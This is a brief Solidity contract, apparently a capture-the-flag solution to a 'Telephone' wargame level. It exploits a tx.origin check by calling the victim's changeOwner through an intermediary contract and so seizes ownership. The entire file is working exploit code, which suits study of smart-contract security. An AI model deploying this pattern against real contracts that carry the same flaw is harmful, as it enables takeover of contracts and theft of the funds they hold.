// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import {Telephone} from "./Telephone.sol";

contract TelephoneAttack {
    Telephone public victim;
    address owner;

    constructor(address _victim) {
        victim = Telephone(_victim);
        owner = msg.sender;
    }

    function attack() public {
        victim.changeOwner(owner);
    }
    
}